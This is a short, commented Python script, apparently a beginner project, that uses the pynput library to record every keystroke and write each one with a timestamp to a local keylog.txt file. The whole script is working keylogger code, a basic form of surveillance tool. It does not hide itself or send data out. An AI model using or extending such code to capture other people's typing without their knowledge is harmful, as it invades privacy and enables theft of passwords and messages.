import pynput # pynput is python library for recording inputs
from pynput.keyboard import Key, Listener
import logging # logging is used to log all the details into a text file

# path where the log file will be stored
# this log file will include all of the monitor keystrokes in the format specied so it's going to store in log directory + keylog.txt and then it's going to format it with time and then the message 
log_dir = r"<ADD PATH OF YOUR PROJECT FOLDER HERE>"
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# on press fucntion, it will take every key press as a parameter and then log this information
def on_press(key):
    logging.info(str(key))

# listner instance and on-press methond are joined to main progeam thread 
with Listener(on_press=on_press) as listner:
    listner.join()
